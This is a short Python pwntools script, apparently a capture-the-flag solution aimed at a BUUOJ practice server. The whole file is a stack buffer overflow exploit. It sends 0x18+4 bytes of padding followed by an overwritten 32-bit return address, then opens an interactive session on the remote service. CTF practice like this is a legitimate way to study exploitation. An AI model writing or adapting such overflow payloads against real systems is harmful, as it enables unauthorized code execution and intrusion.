from pwn import *
from LibcSearcher import *
#context.terminal=['tmux','splitw','-h']
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',27314)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


#ru(b'')
s(b'a'*(0x18+4)+p32(0x804851B))







ii()
